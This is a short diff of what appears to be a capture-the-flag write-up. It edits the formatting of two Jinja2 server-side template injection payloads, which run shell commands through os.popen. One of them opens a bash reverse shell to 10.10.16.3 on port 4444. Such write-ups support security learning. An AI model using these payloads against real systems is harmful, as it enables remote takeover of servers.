@@ -78,12 +78,12 @@ It’s vulnerable to Server Side Template Injection.
 
 Let’s now try to get a reverse shell.
 
-```bash
-{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash shell.sh').read() }}
+```python
+{\{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash shell.sh').read() }}
 
 OR
 
-{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.3/4444 0>&1"').read() }}
+{\{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.3/4444 0>&1"').read() }}
 ```
 
 ```bash
